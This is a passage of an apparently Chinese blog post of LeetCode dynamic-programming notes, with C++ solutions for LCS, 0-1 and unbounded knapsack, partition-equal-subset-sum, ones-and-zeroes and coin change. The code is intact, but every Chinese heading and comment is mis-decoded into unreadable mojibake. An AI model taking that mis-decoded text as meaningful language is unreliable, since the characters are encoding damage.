class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n &lt;= <span class="number">1</span>) <span class="keyword">return</span> n;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> count = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(dp[count<span class="number">-1</span>] &lt; nums[i]) &#123;</span><br><span class="line">                dp[count] = nums[i];</span><br><span class="line">                count++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> pos = <span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j = count<span class="number">-1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(dp[j] &lt; nums[i]) &#123;</span><br><span class="line">                        pos = j;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                dp[pos+<span class="number">1</span>] = nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="1143-æœ€é•¿å…¬å…±å­åºåˆ—"><a href="#1143-æœ€é•¿å…¬å…±å­åºåˆ—" class="headerlink" title="1143. æœ€é•¿å…¬å…±å­åºåˆ—"></a>1143. æœ€é•¿å…¬å…±å­åºåˆ—</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">longestCommonSubsequence</span><span class="params">(string text1, string text2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = text2.<span class="built_in">size</span>(), n = text1.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = text1[<span class="number">0</span>] == text2[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">0</span>], <span class="built_in">int</span>(text1[<span class="number">0</span>] == text2[i]) );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            dp[<span class="number">0</span>][i] = <span class="built_in">max</span>(dp[<span class="number">0</span>][i<span class="number">-1</span>] , <span class="built_in">int</span>(text1[i] == text2[<span class="number">0</span>]));</span><br><span class="line">        &#125; <span class="comment">//åˆå§‹åŒ–</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">                dp[i][j] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][j<span class="number">-1</span>] + (text1[j] == text2[i]), <span class="built_in">max</span>(dp[i<span class="number">-1</span>][j], dp[i][j<span class="number">-1</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m<span class="number">-1</span>][n<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>ç¨å¾®çœ‹äº†ä¸€ä¸‹ç­”æ¡ˆï¼Œ $ dp[i][j] $ è¡¨ç¤ºéå†åˆ° $ text1[i] $ , $ text2[j] $ ä¸ºæ­¢ï¼Œæœ€é•¿å­åºåˆ—æ˜¯å¤šå°‘</p></blockquote><h2 id="èƒŒåŒ…é—®é¢˜"><a href="#èƒŒåŒ…é—®é¢˜" class="headerlink" title="èƒŒåŒ…é—®é¢˜"></a>èƒŒåŒ…é—®é¢˜</h2><h3 id="æ¿å­"><a href="#æ¿å­" class="headerlink" title="æ¿å­"></a>æ¿å­</h3><h4 id="0-1èƒŒåŒ…"><a href="#0-1èƒŒåŒ…" class="headerlink" title="0-1èƒŒåŒ…"></a>0-1èƒŒåŒ…</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">knapsack</span><span class="params">(vector&lt;<span class="type">int</span>&gt; weights, vector&lt;<span class="type">int</span>&gt; values, <span class="type">int</span> N, <span class="type">int</span> W)</span> </span>&#123;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(N + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(W + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= N; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> w = weights[i - <span class="number">1</span>], v = values[i - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= W; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j &gt;= w) &#123;</span><br><span class="line">                dp[i][j] = <span class="built_in">max</span>(dp[i - <span class="number">1</span>][j], dp[i - <span class="number">1</span>][j - w] + v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                dp[i][j] = dp[i - <span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[N][W];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ç”¨è‡ªå·±çš„è¯è¯´ï¼Œé—®é¢˜å°±æ˜¯æœ‰nç§ç‰©å“ï¼Œæ¯ç§ç‰©å“æœ‰1ä¸ªï¼ŒèƒŒåŒ…æœ‰æ€»å®¹é‡é™åˆ¶ï¼Œæ¯ç§ç‰©å“æœ‰ä¸€å®šä»·å€¼ã€‚æ€æ ·è£…å…¥ç‰©å“ï¼Œåœ¨å®¹é‡é™åˆ¶ä¸‹ï¼Œå°½é‡è®©èƒŒåŒ…ä»·å€¼æœ€å¤§<br>$ dp[i][j] $ è¡¨ç¤ºå½“éå†åˆ°ç¬¬iä¸ªç‰©å“æ—¶ï¼ŒèƒŒåŒ…å®¹é‡ä¸ºjæ—¶ï¼ˆå¯ä»¥ä¸æ»¡ï¼‰ï¼ŒèƒŒåŒ…çš„æœ€å¤§ä»·å€¼<br>æ‰€ä»¥çŠ¶æ€è½¬ç§»å‡½æ•°æ˜¯<br>$$<br>dp[i][j] &#x3D; max(dp[i - 1][j], dp[i - 1][j - w_{i-1}] + v_{i-1}), \quad j&gt;&#x3D;w_{i-1} $$<br>$$<br>dp[i][j] &#x3D; dp[i - 1][j], \quad j &lt; w_{i-1}<br>$$</p></blockquote><ul><li>0-1èƒŒåŒ…çš„å‹ç¼©</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">knapsack</span><span class="params">(vector&lt;<span class="type">int</span>&gt; weights, vector&lt;<span class="type">int</span>&gt; values, <span class="type">int</span> N, <span class="type">int</span> W)</span> </span>&#123;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(W + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= N; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> w = weights[i - <span class="number">1</span>], v = values[i - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = W; j &gt;= w; --j) &#123;</span><br><span class="line">            dp[j] = <span class="built_in">max</span>(dp[j], dp[j - w] + v);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[W];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å®Œå…¨èƒŒåŒ…"><a href="#å®Œå…¨èƒŒåŒ…" class="headerlink" title="å®Œå…¨èƒŒåŒ…"></a>å®Œå…¨èƒŒåŒ…</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">knapsack</span><span class="params">(vector&lt;<span class="type">int</span>&gt; weights, vector&lt;<span class="type">int</span>&gt; values, <span class="type">int</span> N, <span class="type">int</span> W)</span> </span>&#123;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(N + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(W + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= N; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> w = weights[i - <span class="number">1</span>], v = values[i - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= W; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j &gt;= w) &#123;</span><br><span class="line">                dp[i][j] = <span class="built_in">max</span>(dp[i - <span class="number">1</span>][j], dp[i][j - w] + v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                dp[i][j] = dp[i - <span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[N][W];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>å’Œ0-1èƒŒåŒ…ä¸åŒçš„æ˜¯ï¼Œæ¯ä¸ªç‰©å“æœ‰æ— é™ä¸ªï¼Œå› æ­¤ä¹Ÿéœ€è¦æ­£å‘éå†ï¼Œä¸”çŠ¶æ€è½¬ç§»å‡½æ•°ä¸­ï¼Œåº”è¯¥æ˜¯åŒåˆ—ä¸­+ç‰©å“ä»·å€¼ï¼Œè¿™æ ·æ‰èƒ½å‘èƒŒåŒ…ä¸­æ”¾å…¥å¤šä¸ªç‰©å“<br>çŠ¶æ€è½¬ç§»å‡½æ•°æ˜¯<br>$$<br>dp[i][j] &#x3D; max(dp[i - 1][j], dp[i][j - w_{i-1}] + v_{i-1}), \quad j&gt;&#x3D;w_{i-1} $$<br>$$<br>dp[i][j] &#x3D; dp[i - 1][j], \quad j &lt; w_{i-1}<br>$$</p></blockquote><ul><li>å®Œå…¨èƒŒåŒ…çš„ç©ºé—´å‹ç¼©<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">knapsack</span><span class="params">(vector&lt;<span class="type">int</span>&gt; weights, vector&lt;<span class="type">int</span>&gt; values, <span class="type">int</span> N, <span class="type">int</span> W)</span> </span>&#123;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(W + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= N; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> w = weights[i - <span class="number">1</span>], v = values[i - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = w; j &lt;= W; ++j) &#123;</span><br><span class="line">            dp[j] = <span class="built_in">max</span>(dp[j], dp[j - w] + v);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[W];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>101ä¹¦ä¸­è¯´</p></blockquote></li></ul><blockquote><p>â€œ0-1 èƒŒåŒ…å¯¹ç‰©å“çš„è¿­ä»£æ”¾åœ¨å¤–å±‚ï¼Œé‡Œå±‚çš„<br>ä½“ç§¯æˆ–ä»·å€¼é€†å‘éå†ï¼›å®Œå…¨èƒŒåŒ…å¯¹ç‰©å“çš„è¿­ä»£æ”¾åœ¨é‡Œå±‚ï¼Œå¤–å±‚çš„ä½“ç§¯æˆ–ä»·å€¼æ­£å‘éå†ã€‚â€</p></blockquote><blockquote><p>ä½†æˆ‘è®¤ä¸ºï¼Œå®Œå…¨èƒŒåŒ…æ­£å‘éå†ä½“ç§¯ï¼Œ0-1èƒŒåŒ…åå‘éå†ä½“ç§¯ï¼Œå†…å±‚å’Œå¤–å±‚éå†ç‰©å“è¿˜æ˜¯å®¹é‡å¹¶æ²¡æœ‰å½±å“</p></blockquote><h3 id="416-åˆ†å‰²ç­‰å’Œå­é›†"><a href="#416-åˆ†å‰²ç­‰å’Œå­é›†" class="headerlink" title="416. åˆ†å‰²ç­‰å’Œå­é›†"></a><a href="https://leetcode.cn/problems/partition-equal-subset-sum/">416. åˆ†å‰²ç­‰å’Œå­é›†</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">canPartition</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> sum = <span class="built_in">accumulate</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>(), <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(sum &amp; <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> target = sum/<span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(target+<span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> w = nums[i<span class="number">-1</span>], v = nums[i<span class="number">-1</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = target; j&gt;=w; j--) &#123;</span><br><span class="line">                dp[j] = <span class="built_in">max</span>(dp[j], dp[j-w] + v);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[target] == sum-target;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>çœ‹äº†ä¸€çœ¼ç­”æ¡ˆçš„æ€è·¯ï¼ŒçŸ¥é“èƒŒåŒ…æ€»å®¹é‡æ˜¯ $ sum&#x2F;2 $ æ‰å†™å‡ºæ¥</p></blockquote><h4 id="101-2"><a href="#101-2" class="headerlink" title="101"></a>101</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">canPartition</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> sum = <span class="built_in">accumulate</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>(), <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(sum &amp; <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> target = sum/<span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">dp</span><span class="params">(target+<span class="number">1</span>, <span class="literal">false</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> w = nums[i<span class="number">-1</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = target; j&gt;=w; j--) &#123;</span><br><span class="line">                dp[j] = dp[j] || dp[j-w];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[target];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœæ”¾å…¥æ•°nums[i]åï¼ŒèƒŒåŒ…å®¹é‡å˜æˆ0äº†ï¼Œé‚£ä¹ˆè¯´æ˜å¯ä»¥è£…æ»¡èƒŒåŒ…</p></blockquote><h3 id="474-ä¸€å’Œé›¶"><a href="#474-ä¸€å’Œé›¶" class="headerlink" title="474. ä¸€å’Œé›¶"></a><a href="https://leetcode.cn/problems/ones-and-zeroes/">474. ä¸€å’Œé›¶</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findMaxForm</span><span class="params">(vector&lt;string&gt;&amp; strs, <span class="type">int</span> m, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> strnum = strs.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m+<span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n+<span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= strnum; i++) &#123;</span><br><span class="line">            <span class="type">int</span> strlen = strs[i<span class="number">-1</span>].<span class="built_in">size</span>();</span><br><span class="line">            <span class="type">int</span> count0, count1 = <span class="built_in">accumulate</span>(strs[i<span class="number">-1</span>].<span class="built_in">begin</span>(), strs[i<span class="number">-1</span>].<span class="built_in">end</span>(), -strlen*<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            count0 = strlen-count1;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = m; j &gt;= count0; j--) &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> k = n; k &gt;= count1; k--) &#123;</span><br><span class="line">                    dp[j][k] = <span class="built_in">max</span>(dp[j][k], dp[j-count0][k-count1]+<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>å–µäº†ä¸€çœ¼ç­”æ¡ˆè¯´è¦ç”¨äºŒç»´èƒŒåŒ…ï¼Œå°±å†™äº†ï¼Œå°±è¿‡äº†<br>ä½†æ˜¯è¿˜æ˜¯æ™•æ™•çš„ï¼Œæ„Ÿè§‰åªæ˜¯åœ¨å¥—æ¨¡æ¿</p></blockquote><h3 id="322-é›¶é’±å…‘æ¢"><a href="#322-é›¶é’±å…‘æ¢" class="headerlink" title="322. é›¶é’±å…‘æ¢"></a><a href="https://leetcode.cn/problems/coin-change/">322. é›¶é’±å…‘æ¢</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">coinChange</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; coins, <span class="type">int</span> amount)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> coinTypes = coins.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(coinTypes+<span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(amount+<span class="number">1</span>, <span class="number">0</span>)), <span class="built_in">dp1</span>(coinTypes+<span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(amount+<span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= coinTypes; i++) &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = amount;</span><br><span class="line">            <span class="type">int</span> w = coins[i<span class="number">-1</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= amount; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(j &gt;= w) &#123;</span><br><span class="line">                    dp[i][j] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][j], dp[i][j-w]<span class="number">-1</span>);</span><br><span class="line">                    dp1[i][j] = <span class="built_in">max</span>(dp1[i<span class="number">-1</span>][j], dp1[i][j-w]+w);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    dp[i][j] = dp[i<span class="number">-1</span>][j];</span><br><span class="line">                    dp1[i][j] = dp1[i<span class="number">-1</span>][j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (dp1[coinTypes][amount] == amount) ? amount - dp[coinTypes][amount] : <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>å¤ªæ…¢äº†ï¼Œéå¸¸ç®€å•çš„æƒ³æ³•ï¼Œä¸€ä¸ªè®°å½•ç”¨äº†å¤šå°‘ç¡¬å¸ï¼Œä¸€ä¸ªè®°å½•å½“å‰èƒŒåŒ…å†…æ€»ä»·å€¼</p></blockquote><h4 id="ç©ºé—´å‹ç¼©"><a href="#ç©ºé—´å‹ç¼©" class="headerlink" title="ç©ºé—´å‹ç¼©"></a>ç©ºé—´å‹ç¼©</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">coinChange</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; coins, <span class="type">int</span> amount)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> coinTypes = coins.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(amount+<span class="number">1</span>, <span class="number">0</span>)</span>, <span class="title">dp1</span><span class="params">(amount+<span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = amount;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= coinTypes; i++) &#123;</span><br><span class="line">            <span class="type">int</span> w = coins[i<span class="number">-1</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = w; j &lt;= amount; j++) &#123;</span><br><span class="line">                dp[j] = <span class="built_in">max</span>(dp[j], dp[j-w]<span class="number">-1</span>);</span><br><span class="line">                dp1[j] = <span class="built_in">max</span>(dp1[j], dp1[j-w]+w);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (dp1[amount] == amount) ? amount - dp[amount] : <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="101-3"><a href="#101-3" class="headerlink" title="101"></a>101</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">coinChange</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; coins, <span class="type">int</span> amount)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> coinTypes = coins.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(amount+<span class="number">1</span>, amount+<span class="number">1</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= amount; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= coinTypes; j++) &#123;</span><br><span class="line">                <span class="type">int</span> w = coins[j<span class="number">-1</span>];</span><br><span class="line">                <span class="keyword">if</span>(i &gt;= w) dp[i] = <span class="built_in">min</span>(dp[i], dp[i-w]+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (dp[amount] == amount+<span 